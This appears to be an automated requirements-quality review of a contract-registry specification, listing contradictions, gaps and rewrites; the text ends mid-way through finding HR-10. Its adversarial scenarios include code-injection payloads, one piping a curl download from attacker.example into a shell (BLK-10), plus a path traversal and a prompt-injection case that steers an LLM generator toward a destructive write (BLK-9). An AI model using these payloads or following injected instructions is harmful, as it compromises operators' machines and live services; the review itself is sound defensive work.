# Requirements Quality Analysis Report

**Input**: ODCS Contract Registry — Specification v0.8.2 (`specs/active/odcs-contract-registry/requirements.md`, 1,179 lines): §1 Purpose, §2 Out of Scope, §3.1–§3.12 (R-01…R-145), §4 NFR-1…NFR-10, §5 E-1…E-62, §6 OQ-1…OQ-17, §7 D-1…D-88.
**Date**: 2026-10-22
**Analyst**: req-quality-analyst v1.0
**Modes**: `ears_mode = true` (118 numbered requirements, all `SHALL`/`SHOULD`/`MAY`-anchored). `contract_mode = false`: the document uses data-contract vocabulary (producer/consumer, schema, version), but it is a requirements spec for a system that *processes* contracts, not a producer/consumer data contract. DC-1…DC-8 were therefore not applied, and the `[Contract only]` checklist rows are N/A.
**Untrusted-content check**: No embedded instructions aimed at the analyst were found. R-144's sentence "The repo `CLAUDE.md` chains the `adversarial-test-review` skill on that block" was treated as requirement text only and not acted on.

---

## Executive Summary

The analysis found **90 findings: 10 Blockers, 38 High Risk, and 42 Clarifications Needed. Verdict: REJECT.** The deterministic-generation, caching, fault-isolation and auth-status design is unusually rigorous. However, the D-63 change from two repos to one monorepo, with source labels taken from the contract's `domain` field, was never carried through the requirement set:
- "source" now means two different things;
- the divergence flag is always `true`;
- branch and path rules contradict each other;
- the contract lifecycle (removal, and the identity of invalid entries) is undefined.

Two security blockers remain:
- LLM-invented write endpoints are emitted despite R-117's "rejected, never emitted" guarantee;
- untrusted catalog strings reach emitted file paths and TypeScript that the CLI executes.

Several v0.8.1/v0.8.2 changes exist only in the changelog, not in the normative requirement text that the spec calls "the oracle".

---

## EARS Structural Analysis

**Format detected**: EARS (Easy Approach to Requirements Syntax)
**Pattern distribution** (118 numbered requirements, classified by leading keyword; statements with more than one keyword counted as Complex):
- Ubiquitous (`shall`): 58
- Event-driven (`WHEN`): 22
- State-driven (`WHILE`): 1 (R-61)
- Unwanted behaviour (`IF … THEN`): 13
- Optional feature (`WHERE`): 3 (R-03, R-64, R-84c)
- Complex (combined): 21 (R-15, R-22, R-33a, R-65, R-81, R-83, R-83a, R-83b, R-85, R-90, R-91, R-91a, R-106, R-113, R-116, R-119, R-120, R-125, R-129, R-132, R-139)
- Non-EARS prose: 10 NFR statements (ubiquitous form with prose qualifiers), 4 section-intro blockquotes (§3.9–§3.12, scoped as notes), the E-1…E-62 table, and the D-log. Normative behaviour also appears in the version changelog and in D-entries (see BLK-2, CN-2).

**Observations (not findings)**:
- R-14, R-81, R-105 and R-116 use `IF` for non-error outcomes that are recorded as "success". These are edge conditions, not the happy path, so they are acceptable under SV-1.
- R-84c's `WHERE` (a declared field map) is a configuration-level option and valid.

**Pattern skew**: 49% ubiquitous and only one pure `WHILE`. §3.9, §3.11 and §3.12 are almost entirely ubiquitous, so their error paths are hidden in prose sub-bullets rather than stated as `IF … THEN`.

**Structural findings**:
- **SV-1 keyword misuse**: BLK-1
- **SV-2 missing / non-action response**: No issues found. NFR-3 "comfortably handle" is assessed under Ambiguity (CN-5) because it carries numeric targets.
- **SV-3 vague trigger**: No issues found.
- **SV-4 non-exitable / undefined state**: HR-1 (WHILE authenticated), HR-2 (WHILE a crawl is in progress)
- **SV-5 error path written as WHEN**: No issues found.
- **SV-6 missing unwanted-behaviour counterpart**: HR-3, HR-4, HR-5, HR-6, HR-7, HR-8
- **SV-7 compound trigger/response**: CN-1
- **SV-8 shall-strength consistency**: HR-9
- **SV-9 prose mixed with EARS**: BLK-2 (escalated: normative changes appear only in the changelog), CN-2, CN-3
- **SV-10 actor ambiguity**: HR-10
- **EARS completeness probes**:
  - Probe 1 (event coverage): HR-11
  - Probe 3 (feature-flag NOT-branch): CN-4

---

## Findings

### BLOCKERS — must be resolved before implementation begins

#### BLK-1: `WHERE` is used for runtime conditions, including an authorisation rule (SV-1)
- **Dimension**: Ambiguity (EARS SV-1)
- **Clause** (R-64):
  > WHERE the authenticated user is in the **writer** group, THE front-end SHALL offer a **Refresh** action that invokes `POST /refresh` and surfaces the returned crawl-run summary; WHERE the user is reader-only, that action SHALL be hidden or disabled.

  (R-03):
  > WHERE a source repository defines contract files, the registry SHALL look for them under the configured **contract path prefix**

  (R-106):
  > and — WHERE the document declares one — its **`Spec version`**.
- **Problem**: `WHERE` is reserved for product-level optional features. These three clauses are runtime conditions: the session's group claim, whether a file is present, and whether a header is present. R-64 encodes a security-relevant per-session authorisation rule as if it were a deployment option.
- **Adversarial scenario**: The registry's own parser (R-103) catalogs R-64 as `earsType: optional`. A reviewer running `GET /requirements?earsType=event` or `?earsType=unwanted` to list runtime behaviours never sees the Refresh authorisation rule. A tester treating R-64 as a feature toggle writes a stage-config test instead of a per-token group test. The case of a writer whose group is removed mid-session is never exercised.
- **Proposed rewrite / missing criterion**:
  ```
  R-64a  WHILE the signed-in user's access token carries the `writer` group, THE front-end SHALL render an enabled Refresh action that invokes POST /refresh and displays the returned crawl-run summary.
  R-64b  IF the signed-in user's access token does not carry the `writer` group, THEN THE front-end SHALL NOT render the Refresh action.
  R-03   THE registry SHALL treat as a contract file only a blob whose path starts with the configured contract path prefix (default `docs/contracts/`, SST Parameter CONTRACT_PATH_PREFIX) and whose name matches the contract glob (see BLK-4).
  R-106b IF the source's docs/spec.md contains a `Spec version` declaration, THEN THE registry SHALL store its value as `specVersion`; otherwise it SHALL store `specVersion: null`.
  ```

#### BLK-2: Normative changes exist only in the version changelog; the "oracle" requirement text does not contain them
- **Dimension**: Consistency
- **Clause** (header):
  > This spec is the **oracle**. Code, tests, and design derive from it. If code and spec disagree, the spec wins until explicitly changed here.

  (v0.8.2 changelog, absent from the R-117b body):
  > **R-117b:** `trigger.path` and `readBack.path` must be plain URL paths (leading `/`, no backtick, `$`, quote, backslash or whitespace) and are emitted as string literals, never as template text

  (v0.8.2 changelog, absent from the R-84d body):
  > **R-84d/R-83c:** sibling-object resolution terminates on a self-referencing or mutually-referencing contract (a repeat is left undeclared)

  (v0.8.2 changelog, while the R-141 body says only "reason redacted"):
  > a failure reason is redacted (GitHub tokens, AWS keys, bearer tokens, JWTs, secret keys, ARN account ids)

  (v0.8.2 changelog, while the R-142 body lists the key as "{plan input hash, emitted-file hash, deterministic-findings hash, critic model id, critic prompt version}"):
  > and the cache key carries a result-shape version.

  (v0.8.1 changelog, which conflicts with D-74 "`PLAN_SCHEMA` v2 (R-117b)"):
  > **R-119/R-119b:** a cache hit is re-validated; the plan-schema version is 3.
- **Problem**: Security-relevant constraints, termination rules, the redaction set, the cache-key composition and the plan-schema version are stated only in release notes. The numbered requirements that tests are traced to omit them, and in one case (v2 vs 3) they contradict a decision. Under the document's own "spec wins" rule, an implementation that drops these behaviours is spec-compliant.
- **Adversarial scenario**: A refactor of the emitter reverts `trigger.path` to template-literal rendering. An LLM plan containing `trigger.path: "/api/x${require('child_process').execSync('id')}"` is then emitted as a backtick string and executes when the file is loaded. Every test traced to the R-117b body still passes, because the body never forbade it. Separately, a contract whose `items` description names its own type recurses without bound. R-84d as written does not require termination.
- **Proposed rewrite / missing criterion**:
  ```
  Fold each changelog item into its numbered requirement as normative text:
  R-117b(d)  THE validator SHALL reject a plan whose trigger.path or readBack.path does not start with "/" or contains a backtick, "$", a quote, a backslash or whitespace; THE emitter SHALL render both paths as JSON string literals only.
  R-84d(e)   Sibling-object resolution SHALL stop on a repeated object name and leave that path undeclared.
  R-141(a)   A redacted reason SHALL contain no GitHub token, AWS access key, bearer token, JWT, secret key, or ARN account id.
  R-142(a)   The critic cache key SHALL include a result-shape version; a cached result that fails shape validation SHALL be treated as a miss.
  R-119b(a)  The current plan-schema version is <2 or 3 — owner to confirm>; D-74 SHALL be amended to match.
  Then add: "The changelog is non-normative; every behaviour change SHALL appear in a numbered requirement."
  ```

#### BLK-3: Crawl branch is contradictory: "default branch" vs the configured feature branch
- **Dimension**: Consistency
- **Clause** (R-10):
  > THE registry SHALL crawl **every** configured source repository's default branch via the GitHub API

  (R-01):
  > v1 SHALL define exactly one source entry: `awp-app-plane` → `collegeboard-software/awp-app-plane`, branch `feat/end-to-end-testing-registry` (D-63).

  (R-100):
  > at `docs/spec.md` on its default branch

  (D-8):
  > The crawler fetches contracts from each repo's **default branch (main)** via the GitHub API
- **Problem**: R-01 and D-65 make the crawl target a configured, non-default branch. R-10, R-100 and D-8 require the default branch. No implementation can satisfy both while `SOURCE_BRANCH` ≠ the repository default.
- **Adversarial scenario**: `awp-app-plane`'s default branch is `main`, where the contracts differ from `feat/end-to-end-testing-registry`. A test traced to R-10 asserts that the crawl-run commit SHA equals `main`'s tip, and it fails against the shipped code. If a maintainer "fixes" the code to match R-10, the catalog silently swaps to `main`'s contracts and every committed generated test goes stale.
- **Proposed rewrite / missing criterion**:
  ```
  R-10  WHEN an authorised writer invokes POST /refresh, THE registry SHALL crawl each configured source repository at its configured target branch (R-01; overridable per stage by SOURCE_BRANCH, D-65) via the GitHub API.
  R-100 … at docs/spec.md on the source's configured target branch …
  D-8   Amend to "configured target branch (R-01/D-65)"; mark the "default branch (main)" wording superseded by D-63/D-65.
  ```

#### BLK-4: Contract discovery pattern is stated three incompatible ways
- **Dimension**: Consistency
- **Clause** (R-10):
  > discover all matching `contract/*.odcs.yaml` files

  (R-03):
  > (default `docs/contracts/`, overridable via the `CONTRACT_PATH_PREFIX` SST Parameter — D-65) matching the glob `*.odcs.ya?ml`.

  (R-23):
  > any non-`*.odcs.yaml` file as **not a contract**

  (E-2):
  > A source repo has no `contract/*.odcs.yaml` files
- **Problem**: The directory (`contract/` vs `docs/contracts/`) and the extension (`.yml` accepted by R-03, rejected by R-23) conflict. Whether the glob matches nested sub-directories is also unstated.
- **Adversarial scenario**: `docs/contracts/score/ResultPackage.odcs.yml` is added on the branch.
  - R-03 says it is a contract, unless `*` does not cross `/`.
  - R-23 says it is not a contract (`.yml`).
  - R-10 says it is out of scope (wrong directory).

  Three testers write three mutually exclusive assertions. E-2 tests a directory that no longer exists.
- **Proposed rewrite / missing criterion**:
  ```
  R-03  THE registry SHALL treat a blob as a contract file IFF its path starts with the configured contract path prefix (default "docs/contracts/") and its file name matches the regex ^[^/]+\.odcs\.ya?ml$ [owner: state whether sub-directories below the prefix are included].
  R-10  … discover all contract files per R-03 …
  R-23  THE registry SHALL treat the vendored ODCS schema document and any blob not matching R-03 as not a contract.
  E-2   "A source has no contract files per R-03."
  ```

#### BLK-5: "Source" is overloaded: crawl source (R-01 entry) vs catalog label (contract `domain`)
- **Dimension**: Ambiguity
- **Clause** (R-01):
  > The catalog source label for an individual contract is resolved as the contract's ODCS `domain` field when present, falling back to the source entry's label when absent (D-63).

  (R-13):
  > SHALL leave the previously-cataloged entries for the failed source unchanged (no partial deletion).

  (R-12):
  > per-source counts of files discovered / valid / invalid / new-version / unchanged

  (R-30a):
  > IF two discovered files **within a single source** declare the same contract `id`

  (R-65):
  > that lists **each crawled source** and, beneath each, **every ODCS contract associated with that source**
- **Problem**: After D-63 there is one crawl source (`awp-app-plane`), but catalog entries are keyed by domain labels (`create`, `get-ready`, `score`, …). R-12, R-13, R-30a, R-65, R-105, R-110 and E-1/E-18 use "source" without saying which meaning applies, and the two readings give different behaviour.
- **Adversarial scenario**:
  - `docs/contracts/a.odcs.yaml` (`domain: create`, `id: X`) and `docs/contracts/b.odcs.yaml` (`domain: get-ready`, `id: X`): under R-30a, "single source" = `awp-app-plane` means a collision (catalog `a`, warn). "Single source" = label means two valid entries.
  - When the `awp-app-plane` crawl fails (E-16 rate limit), R-13's "entries for the failed source" matches no entry literally, because none is labelled `awp-app-plane`.
  - R-12 counts could be keyed by crawl source or by label; the response schema cannot be tested.
- **Proposed rewrite / missing criterion**:
  ```
  Add to §3.1:
  "Crawl source" = an R-01 configuration entry (label, owner/repo, branch).
  "Catalog label" = the per-contract label resolved from ODCS `domain`, falling back to the crawl source label.
  Then restate each requirement with the explicit term, e.g.:
  R-13  … SHALL leave unchanged every catalog entry discovered from the failed crawl source (all catalog labels) …
  R-12  … per-crawl-source counts, each broken down by catalog label …
  R-30a IF two files discovered from one crawl source resolve to the same {catalog label, id} … (or: the same id — owner to choose)
  R-65  … lists each catalog label present in GET /contracts …
  ```

#### BLK-6: The `divergent` flag is always `true`, because the label lives inside the hashed content
- **Dimension**: Consistency
- **Clause** (R-53):
  > a boolean **`divergent`** flag (true IFF the variants' current content hashes differ)

  (D-38):
  > Each file's git blob SHA (SHA-1) _is_ the content hash that drives the append-only version model (D-10) and the cross-repo divergence check (R-34)

  (E-5):
  > `GET /entities/org` reports `divergent: false` (R-30, R-34)
- **Problem**: Since D-63, two variants of an entity carry different catalog labels only because their files have different `domain` values (or one lacks `domain`). Their bytes, and therefore their blob SHAs, always differ, so `divergent` is true for every multi-variant entity. E-5 is unreachable, and the registry's core purpose (§1, "making cross-service contract divergence **visible**") degrades into an always-on flag.
- **Adversarial scenario**: `create/TaskPublished.odcs.yaml` and `get-ready/TaskPublished.odcs.yaml` are byte-identical except for `domain: create` vs `domain: get-ready` and `id`. GET /entities/TaskPublished returns `divergent: true` with an empty semantic diff. The SPA (R-61) flags every shared entity as divergent, so real drift is indistinguishable from noise.
- **Proposed rewrite / missing criterion**:
  ```
  R-53  … a boolean `divergent` flag, true IFF the semantic per-property diff (D-18) over the variants' `schema[]` is non-empty. Identity and labelling fields (`id`, `domain`, `name`, `version`, `status`, `tags` — owner to confirm the list) SHALL be excluded from the comparison.
  E-5   Re-express as: two variants whose `schema[]` is identical report `divergent: false` even though their blob SHAs differ.
  R-34 / D-38  Remove "cross-repo divergence check" from the blob-SHA role.
  ```

#### BLK-7: Contract removal is unspecified; E-28 is unreachable and removed contracts keep generating tests
- **Dimension**: Completeness
- **Clause** (R-80):
  > THE registry SHALL read the **current catalog** (the entries persisted by the most recent crawl)

  (E-28):
  > A contract present in a prior generation is **removed** from the catalog, then re-generated

  (R-107, the requirements analogue that does exist):
  > requirements **absent** from the newly-crawled document SHALL be **dropped** from the catalog.
- **Problem**: R-31/R-32/R-33 cover new, unchanged and changed contracts. No requirement covers a {label, id} that a successful crawl no longer discovers (file deleted, `id` renamed, `domain` changed, or prefix changed). Nothing ever removes a contract from the catalog, so E-28 cannot occur.
- **Adversarial scenario**: `docs/contracts/class-roster.odcs.yaml` is deleted from the branch. The next crawl discovers 6 files instead of 7. The `class-roster` entry stays "current" in GET /contracts, POST /generate-tests emits a conformance test for it (R-83), and the CLI commits a test for a contract that no longer exists. If the author instead renames `domain: create` to `domain: creator`, a second entry appears and the old one is orphaned permanently.
- **Proposed rewrite / missing criterion**:
  ```
  R-35  WHEN a crawl of a crawl source succeeds and a previously-cataloged entry discovered from that crawl source is not rediscovered, THE registry SHALL mark the entry `status: removed`, retain its version history (R-33), exclude it from GET /contracts unless `?includeRemoved=true`, exclude it from generation (R-80/R-115), and count it as `removed` in the crawl-run record (R-12).
  R-35a IF the crawl source failed (R-13), THEN THE registry SHALL NOT mark any of its entries removed.
  ```

#### BLK-8: Identity of an invalid (unparseable) contract entry is undefined
- **Dimension**: Completeness
- **Clause** (R-21):
  > THE registry SHALL catalog the entry with `validation: invalid` and a structured list of the failing paths / rules

  (R-30):
  > THE registry SHALL catalog each contract under the composite identity **{source label, contract id}**.

  (R-22):
  > WHEN a discovered file validates successfully, THE registry SHALL extract catalog metadata from it
- **Problem**: A file that fails YAML parsing has no `id` and no `domain`. A schema-invalid file is not guaranteed to have either, and R-22 extracts metadata only from valid files. R-21 requires such a file to be cataloged, but neither its key, its catalog label nor its entity (shown in R-50 rows) is defined.
- **Adversarial scenario**: `docs/contracts/user.odcs.yaml` gains a tab-indentation error. The implementation must invent a key (perhaps the file path). After the author fixes the file, it is keyed by `{create, user-v1}`. The path-keyed invalid entry is never removed (BLK-7), so GET /contracts shows a permanently invalid ghost `user` alongside the valid one, and R-85 records a skip for it on every generation.
- **Proposed rewrite / missing criterion**:
  ```
  R-21a IF a discovered file fails YAML parsing, or parses without a string `id`, THEN THE registry SHALL catalog it under {crawl source label, "path:" + file path}, with entity = file-name stem (D-12) and validation: invalid.
  R-21b IF a file parses with a string `id` but fails ODCS validation, THEN THE registry SHALL catalog it under {resolved catalog label, id}, with entity per R-22's fallback rules.
  R-21c WHEN a file previously cataloged under a "path:" key is next discovered with a valid id, THE registry SHALL mark the path-keyed entry removed (BLK-7).
  ```

#### BLK-9: R-117 promises unknown targets are "rejected, never emitted", but R-133(e)/D-88 emit ungrounded write paths
- **Dimension**: Consistency
- **Clause** (R-117):
  > so every plan references only entities/endpoints present in the supplied context — a plan that names an unknown target is rejected, never emitted (mitigates hallucination).

  (R-133, Major):
  > (e) a `trigger.path` or read-back `path` that is not present in any configured API mapping (OQ-15).

  (D-88):
  > `API_MAP` stays read-only. R-133e stays **Major**.
- **Problem**: `API_MAP` holds only read paths, so every trigger write path is, by construction, an endpoint absent from the supplied context. R-117 says such a plan is rejected. R-133(e)/D-88 say it is emitted with a Major finding. The anti-hallucination guarantee is false for the one part of the plan that performs writes against live services.
- **Adversarial scenario**: Requirement prose in `docs/spec.md` (repo-authored, not controlled by the registry, D-3) mentions "POST /api/admin/tenants/purge", or contains injected text steering the model. The LLM emits `trigger: {method: POST, path: "/api/admin/tenants/purge", payload: {...}}`. This is ungrounded, so only a Major finding, so the plan is emitted and committed. When the future runner executes the suite with `GET_READY_TOKEN`/publisher tokens against non-prod, it performs a destructive write that no one reviewed against a mapping.
- **Proposed rewrite / missing criterion**:
  ```
  R-117 … every plan SHALL reference only entities and READ endpoints present in the supplied context; a read-back path not in the context SHALL be rejected. Trigger write paths are not grounded (D-88) and SHALL be reported under R-133(e).
  R-123a Each emitted functional file whose trigger path is ungrounded SHALL carry, in its generated header, the line "UNGROUNDED WRITE: <METHOD> <path>", so the human reviewer (D-34) sees every unmapped write before committing.
  [Owner decision: confirm that D-88 accepts LLM-chosen write endpoints reaching live services once the future runner exists, or reopen OQ-15 option (a).]
  ```

#### BLK-10: Untrusted catalog strings reach emitted file paths and executed TypeScript with no sanitisation requirement
- **Dimension**: Completeness (security boundary)
- **Clause** (R-92):
  > `generated-tests/conformance/<source>.<entity>.generated.test.ts`; `generated-tests/compat/<entity>.generated.test.ts`

  (R-144):
  > In `--local` mode, and in the default §3.9 mode after download, it SHALL run the R-135 **`executed`** tier.

  (R-135):
  > **`executed`** runs the emitted compat file under Vitest in a temp directory (CLI and offline suite);
- **Problem**: `<source>` (ODCS `domain`), `<entity>` (`schema[0].name`) and property names are free strings from repo-authored YAML. ODCS v3.1.0 validation does not restrict their character set. No requirement constrains how these values become file names (R-92, R-117d, R-144 `adversarial-reports/{runId|jobId}/`) or how they are embedded in emitted code (R-87). The CLI writes these files to the operator's working tree, then executes compat files under Vitest on the operator's machine, where AWS credentials are present (R-91a).
- **Adversarial scenario**:
  - (1) A contract sets `schema[0].name: "../../scripts/postinstall"`. R-92's path becomes `generated-tests/compat/../../scripts/postinstall.generated.test.ts`, and the CLI (R-91) writes outside `generated-tests/`.
  - (2) A property is named `a'); require('child_process').execSync('curl https://attacker.example | sh'); ('`. It is embedded in the compat test, which R-144 executes locally with the operator's SSO session.
- **Proposed rewrite / missing criterion**:
  ```
  R-87a THE generator and the functional emitter SHALL embed every catalog-derived string (labels, entity names, property paths, descriptions, payload values) in emitted code only as a JSON-encoded string literal, never as an identifier, template-literal text, or comment content.
  R-92a THE generator SHALL derive each emitted file-name segment from catalog values by normalising them to [a-z0-9-] (lower-case; other characters replaced by "-"), and SHALL detect and record a collision when two targets normalise to the same name.
  R-91b THE CLI SHALL refuse to write, and SHALL exit non-zero on, any artifact path that resolves outside generated-tests/ (or adversarial-reports/ for R-144).
  ```

---

### HIGH RISK — will likely cause bugs, rework, or test gaps if not addressed

#### HR-1: `WHILE authenticated` has no exit transition; expired tokens are indistinguishable from forbidden (SV-4)
- **Dimension**: Completeness (EARS SV-4)
- **Clause** (R-61):
  > WHILE authenticated, THE front-end SHALL list cataloged contracts **grouped by entity**

  (D-21):
  > a present-but-rejected token — invalid, expired, or lacking the required group — returns `403`.
- **Problem**: The state is entered via R-60, but no requirement defines leaving it: no sign-out, token expiry or refresh behaviour. Because D-21 maps "expired" to 403, the SPA cannot tell session expiry from authorisation denial by status code.
- **Adversarial scenario**: A user leaves the tab open past the access-token lifetime and clicks a contract. GET /contracts/{source}/{id} returns 403. The SPA either shows "forbidden" to a legitimate reader or renders an empty panel, and never returns to the sign-in gate. On a shared demo machine there is no way to sign out.
- **Proposed rewrite / missing criterion**:
  ```
  R-66 WHEN an API call returns 403 and the held access token's `exp` is in the past, THE front-end SHALL obtain new tokens with the refresh token or, IF refresh fails, return the user to the sign-in gate (R-60).
  R-67 WHEN the user selects Sign out, THE front-end SHALL revoke the refresh token, discard all held tokens, and show the sign-in gate.
  ```

#### HR-2: Crawl lock TTL duration and expiry semantics are unspecified (SV-4)
- **Dimension**: Completeness (EARS SV-4)
- **Clause** (R-15):
  > with a TTL fallback so a crashed crawl cannot deadlock future runs (D-15).
- **Problem**: The exit from `WHILE a crawl is already in progress` after a crash depends on an unspecified TTL. DynamoDB's TTL deletion runs in the background and can lag expiry significantly. If acquisition checks only `attribute_not_exists`, a crashed crawl blocks refresh until background deletion happens. If the TTL is shorter than the crawl, two crawls overlap.
- **Adversarial scenario**: The crawl Lambda is killed at its timeout while holding the lock. The lock's TTL attribute expires, but the item has not yet been deleted. Every POST /refresh returns 409 with a dead run id for an unbounded period, which E-11 reports as correct behaviour. Conversely, with TTL = 10 s and a 25 s crawl, a second refresh at t = 12 s starts a concurrent crawl.
- **Proposed rewrite / missing criterion**:
  ```
  R-15a The lock item SHALL carry expiresAt = acquisition time + L, where L ≥ the crawl Lambda's configured timeout. Acquisition SHALL succeed IFF the item is absent OR expiresAt < now (conditional write); correctness SHALL NOT depend on DynamoDB TTL deletion.
  R-15b IF a 409 is returned for a lock whose expiresAt < now, that is a defect.
  ```

#### HR-3: No unwanted-behaviour requirement for sign-in failure or the admin-created user's first sign-in (SV-6)
- **Dimension**: Completeness (EARS SV-6)
- **Clause** (R-60):
  > SHALL only reach the app after successful authentication (access token attached to every API call).

  (R-70):
  > users are **admin-created** only (D-17).
- **Problem**: Only the success path is specified. Admin-created Cognito users begin with a temporary password, and the first SRP sign-in returns a new-password challenge. Wrong password, disabled user and throttled attempts are also unspecified.
- **Adversarial scenario**: An administrator creates `analyst@cb` in the console. On first sign-in the SPA receives a `NEW_PASSWORD_REQUIRED` challenge that no requirement covers, so the user cannot enter the app. Five wrong passwords trigger Cognito throttling, and the message shown is undefined.
- **Proposed rewrite / missing criterion**:
  ```
  R-60a IF sign-in returns a new-password challenge, THEN THE front-end SHALL prompt for and submit a new password before entering the app.
  R-60b IF sign-in fails (incorrect credentials, user disabled, or attempt limit exceeded), THEN THE front-end SHALL remain on the sign-in gate and display a message that does not reveal whether the username exists.
  ```

#### HR-4: A crash mid-crawl leaves a mixed catalog and no run record; "partially-corrupt" is undefined (SV-6)
- **Dimension**: Completeness (EARS SV-6)
- **Clause** (R-12):
  > WHEN a crawl completes, THE registry SHALL persist a **crawl-run record**

  (NFR-4):
  > A crawl SHALL never leave the catalog in a partially-corrupt state.

  (R-107):
  > THE registry SHALL **replace that source's requirement set wholesale**
- **Problem**: The run record is written only on completion. No `IF` covers a crawl that terminates early because of a timeout, a DynamoDB/S3 write failure or a throttle. Multi-item writes (versions, requirement snapshot replacement) are not atomic, and "partially-corrupt" has no testable definition.
- **Adversarial scenario**: The Lambda times out after appending new versions for 4 of 9 contracts and deleting 20 of 45 old `REQ#` items. No run record exists, the lock eventually expires, and GET /requirements returns 25 requirements, a mix of commit A and commit B. Whether this is "partially-corrupt" is undefined, so no test can fail.
- **Proposed rewrite / missing criterion**:
  ```
  R-12a WHEN a crawl starts, THE registry SHALL persist the crawl-run record with status `running`; WHEN it completes, it SHALL set status `succeeded`.
  R-12b IF the crawl terminates before completion (timeout, storage error), THEN the run record SHALL be reported as `incomplete` by GET /crawls (based on the lock's expiresAt).
  NFR-4 Define: "partially-corrupt" = a reader observes, for one catalog label, contract entries or requirements from two different crawl commits. A reader SHALL never observe this state.
  ```

#### HR-5: Synchronous generation has no defined behaviour past the gateway limit, which NFR-8 states only as SHOULD (SV-6)
- **Dimension**: Completeness (EARS SV-6)
- **Clause** (NFR-8):
  > A generation run over the catalog SHOULD complete **synchronously within the API Gateway timeout (<29 s)** for the v1 scale (2 sources × ~4 entities)

  (NFR-10):
  > At v1 scale, the §3.9 run including its `manifest`-tier mutation SHALL still complete within the synchronous API Gateway limit (NFR-8).
- **Problem**: The gateway limit is a hard platform cut-off, not a preference. NFR-8 says SHOULD and NFR-10 says SHALL for the same bound. Neither defines what happens when generation exceeds it or fails to persist. R-127 adds inline mutation (M1–M4 + C1 per entity, each regenerated) to the synchronous path.
- **Adversarial scenario**: At the NFR-3 scale (≥10 labels × ≥25 contracts), generation plus mutation takes 35 s. API Gateway returns 503 to the CLI. The Lambda may still persist the run. The CLI reports failure, the operator retries, and two generation runs exist, with `latest` pointing at whichever finished last.
- **Proposed rewrite / missing criterion**:
  ```
  NFR-8  A §3.9 generation run SHALL complete within <N> s [owner: a margin below the gateway integration timeout] at the NFR-3 scale.
  R-80b  IF a generation run fails before persistence, THEN THE registry SHALL persist the generation-run record with status `failed` and a redacted reason, and SHALL NOT persist a partial artifact set.
  R-80c  IF the client connection times out but the run completes, THEN the run SHALL be retrievable via GET /test-artifacts/{runId}, and the CLI SHALL instruct the operator to use --pull rather than re-trigger.
  ```

#### HR-6: The async job cannot mark itself `failed` on a hard timeout; async retries can run it again (SV-6)
- **Dimension**: Feasibility (EARS SV-6)
- **Clause** (E-47):
  > The job record is marked `failed`; the **previously-committed** `generated-tests/functional/**` are left **untouched**

  (D-57):
  > The async functional-gen worker runs with `timeout: "15 minutes"` and `memorySize: "1024 MB"`
- **Problem**: A Lambda killed at its timeout cannot run code to update its record. Nothing else is required to detect a stale `running` job. Status transitions (`pending`→`running`→terminal) are listed in R-124 but never specified. If the worker is invoked asynchronously, the platform's default retry behaviour can re-execute a failed or timed-out job under the same job id; the spec does not address this.
- **Adversarial scenario**: 120 groundable requirements × (1 synthesis + 2 critic calls) × about 8 s each ≈ 48 min, which exceeds the 15-minute limit. The worker is killed at 15:00, and the record says `running` forever (feeding HR-8). If retried, the job restarts, re-invokes Bedrock for uncached plans, and overwrites the same S3 prefix.
- **Proposed rewrite / missing criterion**:
  ```
  R-124a THE job record SHALL carry `deadline` = start + worker timeout. IF status is `running` or `pending` and now > deadline + <grace>, THEN every read (R-125) SHALL report status `failed`, reason `timeout`.
  R-124b THE worker SHALL NOT be retried automatically; a re-run SHALL require a new POST /generate-functional-tests.
  R-124c [Owner] State the maximum number of groundable requirements one job must process within the worker timeout, or require chunking.
  ```

#### HR-7: The SPA Refresh action has no specified error behaviour (SV-6)
- **Dimension**: Completeness (EARS SV-6)
- **Clause** (R-64):
  > THE front-end SHALL offer a **Refresh** action that invokes `POST /refresh` and surfaces the returned crawl-run summary
- **Problem**: R-15 (409 + run id), R-16 (403) and a gateway timeout during a long crawl (HR-12) are all expected responses. None has a defined UI outcome, and repeated clicks are unguarded.
- **Adversarial scenario**: A writer double-clicks Refresh. Request 1 starts the crawl and request 2 gets 409. The SPA shows an error toast while the crawl succeeds. Alternatively, the crawl takes 31 s, the gateway returns 503, and the SPA shows "Refresh failed" although the crawl-run record shows success.
- **Proposed rewrite / missing criterion**:
  ```
  R-64c WHILE a Refresh request is in flight, THE front-end SHALL disable the Refresh action.
  R-64d IF POST /refresh returns 409, THEN THE front-end SHALL display "crawl already running" with the returned run id.
  R-64e IF POST /refresh returns 5xx or times out, THEN THE front-end SHALL display that the outcome is unknown and link to GET /crawls (R-55).
  ```

#### HR-8: The CLI's poll-to-completion is unbounded, and failed-job behaviour is unspecified (SV-6)
- **Dimension**: Completeness (EARS SV-6)
- **Clause** (R-126):
  > THE `generate-tests` CLI SHALL gain a mode that **triggers** a functional-generation job, **polls** it to completion

  (R-91a):
  > THE CLI SHALL **exit with a directive error**, never hang.
- **Problem**: No maximum wait, no exit code, and no rule for a `failed` job. This combines with HR-6 to give an infinite loop.
- **Adversarial scenario**: The job record stays `running` after a worker kill. The CLI polls forever in a terminal or CI shell. If the job ends `failed` with an empty artifact set and the CLI writes it, `generated-tests/functional/` is wiped (see HR-16).
- **Proposed rewrite / missing criterion**:
  ```
  R-126a THE CLI SHALL stop polling after <worker timeout + grace> and exit non-zero with the job id.
  R-126b IF the job ends `failed`, THEN THE CLI SHALL write nothing to generated-tests/functional/ and SHALL exit non-zero with the redacted reason.
  ```

#### HR-9: Critic caching is SHOULD, but NFR-10 and E-58 depend on it as SHALL (SV-8)
- **Dimension**: Consistency (EARS SV-8)
- **Clause** (R-142):
  > Critic output SHOULD be **cached**

  (NFR-10):
  > The critic SHALL make at most **two** Bedrock calls per plan per cache miss (R-137, R-142), so critic cost is bounded by the critic cache like synthesis (NFR-9).

  (E-58):
  > critic cache hit, no Bedrock call
- **Problem**: A conforming implementation may omit the cache, yet E-58's expected outcome and NFR-10's cost bound require it.
- **Adversarial scenario**: The cache is omitted (allowed by SHOULD). Each unchanged CLI run makes 2 Opus calls × 40 plans = 80 billable calls, and the E-58 test ("no Bedrock call") fails against a spec-compliant implementation.
- **Proposed rewrite / missing criterion**:
  ```
  R-142 Critic output SHALL be cached, keyed by {…}. A cache hit SHALL NOT invoke Bedrock.
  ```

#### HR-10: Runtime behaviour of emitted tests is normative but cannot be verified within scope (SV-10)
- **Dimension**: Verifiability (EARS SV-10)
- **Clause** (R-83):
  > THE generator SHALL emit one **live API-conformance** test that, WHEN later run, SHALL fetch records for the contract's **entity**

  (R-93):
  > their presence or absence SHALL NOT affect the registry's unit test run.
